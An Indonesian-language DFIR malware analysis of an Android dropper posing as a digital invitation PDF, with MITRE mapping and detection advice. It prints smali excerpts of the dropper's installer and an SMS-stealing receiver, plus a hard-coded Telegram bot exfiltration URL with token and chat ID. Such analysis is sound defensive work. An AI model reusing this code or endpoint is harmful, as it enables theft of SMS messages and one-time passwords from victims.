# Source Code Analysis – File Undangan Digital Pdf.apk

_Last updated: 11 Nov 2025_

## 1. Scope & Tooling
- **Samples:** `File Undangan Digital Pdf.apk` (wrapper) dan payload tersembunyi `File Undangan Digital Pdf_payload.apk`.
- **Tools:** Androguard 4.1.3, custom Python extractors, manual smali review.
- **Objectives:** Mengurai struktur kode, mengidentifikasi fungsi penting, serta menilai indikator statis yang dapat dipakai untuk deteksi forensik.

## 2. Wrapper Application (`com.example.droppev11134.p`)
### 2.1 Manifest Highlights
| Parameter | Nilai | Implikasi |
| --- | --- | --- |
| `android:debuggable` | `true` | Build development; mudah dimodifikasi ulang. |
| Izin | `READ/WRITE_EXTERNAL_STORAGE`, `REQUEST_INSTALL_PACKAGES`, custom permission | Hanya cukup untuk menyalin & memasang APK kedua. |
| Komponen | 1 launcher activity, FileProvider (`com.example.droppev11134.p.provider`) | Menyediakan jalur legal untuk membagikan file `.apk` ke installer. |

### 2.2 Kode Kritis: `MainActivity.installApkFromAssets()`
```smali
const-string v0, ".apk"
invoke-virtual {p0}, Lcom/example/droppev11134/p/MainActivity;->getAssets()Landroid/content/res/AssetManager;
invoke-virtual {assetMgr, v0}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
...
invoke-static {context, authority, outFile}, Landroidx/core/content/FileProvider;->getUriForFile(...)
new-instance v7, Landroid/content/Intent;
const-string v8, "android.intent.action.VIEW"
invoke-virtual {v7, uri, "application/vnd.android.package-archive"}, Landroid/content/Intent;->setDataAndType(...)
invoke-virtual {p0, v7}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
```
**Interpretasi:** Seluruh kode wrapper hanya bertugas mengekstrak `assets/.apk` (111 MB) ke folder `getExternalFilesDir(DOWNLOADS)` lalu memicu installer. Tidak ada logika lain seperti UI kompleks atau jaringan.

## 3. Embedded Payload (`com.google.myandroidpr`)
### 3.1 Manifest & Permissions
- **Launcher tersembunyi:** `intent-filter` hanya memiliki kategori `INFO`, sehingga ikon tidak tampil pada launcher standar.
- **Izin berbahaya:** `READ_SMS`, `RECEIVE_SMS`, `SEND_SMS`, `RECEIVE_BOOT_COMPLETED`, `FOREGROUND_SERVICE`, `BIND_NOTIFICATION_LISTENER_SERVICE`, `ACCESS_NETWORK_STATE`, `INTERNET`.
- **Komponen utama:**
  - `com.example.myapplicatior.ReceiveSms` (receiver, exported, filter `android.provider.Telephony.SMS_RECEIVED`).
  - `com.example.myapplicatior.SendSMS` (receiver, exported) – indikasi auto reply / forward.
  - `com.example.myapplicatior.NotificationService` (service dengan permission `android.permission.BIND_NOTIFICATION_LISTENER_SERVICE`).
  - Berbagai `androidx.work.impl.*` receiver/service untuk persistensi.

### 3.2 SMS Capture Flow
```smali
.class public Lcom/example/myapplicatior/ReceiveSms;
.super Landroid/content/BroadcastReceiver;

.method public onReceive(Landroid/content/Context; Landroid/content/Intent;)V
    const-string v1, "pdus"
    invoke-virtual {intent, v1}, Landroid/content/Intent;->getSerializableExtra(Ljava/lang/String;)Ljava/io/Serializable;
    ...
    invoke-virtual {smsMessage}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;
    invoke-static {context, body, sender}, Lcom/example/myapplicatior/NetworkClient;->reportSms(... )V
.end method
```
- `NetworkClient.reportSms()` mendefinisikan URL basis `https://api.telegram.org/bot8422930154:AAEjQjDs3evwPbpgKc5cEPi045zJsJBHRAI/sendMessage` dan menyuntikkan teks `Berhasil Kirim SMS dari Jauh...` atau `Error : _` bergantung pada status.

### 3.3 Notification Listener
- `NotificationService` mewarisi `android.service.notification.NotificationListenerService`.
- Mengaktifkan flag `android:label="notification_service"` dan `exported="false"` namun tetap memerlukan persetujuan pengguna. Jika diaktifkan, konten notifikasi (OTP email, aplikasi keuangan) dapat disalin lewat modul yang sama.

### 3.4 Persistensi & Schedulling
- Receiver `androidx.work.impl.*` memetakan WorkManager Constraint Proxy (Battery, Network, Storage) untuk menjadwalkan ulang pekerjaan setelah reboot (`ConstraintProxyUpdateReceiver`).
- Service `androidx.work.impl.background.systemjob.SystemJobService` membutuhkan `android.permission.BIND_JOB_SERVICE`, memastikan tugas berjalan sebagai JobScheduler.

### 3.5 Logging dan Artefak Tambahan
| Artefak | Deskripsi | Nilai Deteksi |
| --- | --- | --- |
| `assets/.apk` | Payload besar tanpa nama | Cari file `.apk` tersembunyi dengan ukuran >100 MB di dalam aplikasi mencurigakan. |
| `/data/data/com.google.myandroidpr/logs` | Folder log internal | Bisa dipakai untuk memulihkan bukti OTP yang sudah dicuri. |
| Telegram Bot Token | `8422930154:AAEjQjDs3evwPbpgKc5cEPi045zJsJBHRAI` | IOC jaringan khusus untuk blokir / hunting. |
| Chat ID | `6731719218` | Parameter query pada URL `sendMessage`. |

## 4. Code Quality & Obfuscation Notes
- Tidak ada obfuscation kelas (nama package masih deskriptif) → mempermudah reverse engineering.
- Menggunakan Kotlin/Jetpack dependency standar; tidak ditemukan native library atau DexLoader tambahan.
- Dependensi WorkManager & NotificationListener menunjukkan target v26+ (selaras dengan manifest minSdk 26).

## 5. MITRE ATT&CK Coverage (Source-Code View)
| Tactic | Technique ID | Bukti di Kode |
| --- | --- | --- |
| Initial Access | T1476 (Deliver Malicious App) | Dropper memaksa pengguna memasang payload melalui installer bawaan. |
| Execution | T1407 (Download New Code at Runtime) | `installApkFromAssets()` melakukan instalasi APK baru secara otomatis. |
| Defense Evasion | T1406 (Obfuscated/Compressed Files &amp; Information) | Payload disimpan sebagai aset besar yang tidak diekstrak saat pemeriksaan cepat. |
| Collection | T1412 (Capture SMS Messages) | `ReceiveSms` membaca PDUs dan meneruskannya ke `NetworkClient`. |
| Command & Control | T1102 (Web Service) | Hard-coded Telegram Bot API digunakan untuk eksfil data. |

## 6. Rekomendasi Teknis
1. **YARA/Rule Creation:** Cari string `assets/.apk` + authority `com.example.droppev11134.p.provider` untuk mendeteksi dropper serupa.
2. **Static Blocklist:** Masukkan hash `38360cba3e5faff35a8cde1c91fe6c7cc126a118aab9e15f2e7a5f38d0ed77ff` (wrapper) dan `6085ca7bd272ac835c9293cacae2c85f822b130a417df72b95b26365df5eadd6` (payload) ke sistem MDM / EDR.
3. **Code Review Checklist:** Jika aplikasi internal PT CMWI membutuhkan FileProvider, wajib audit agar tidak dapat dipakai untuk menyelundupkan APK.
4. **Network Detection:** Buat signature proxy/IDS untuk permintaan `api.telegram.org/.../sendMessage` dengan token di atas.

---
Disusun oleh: Tim DFIR – PT CMWI
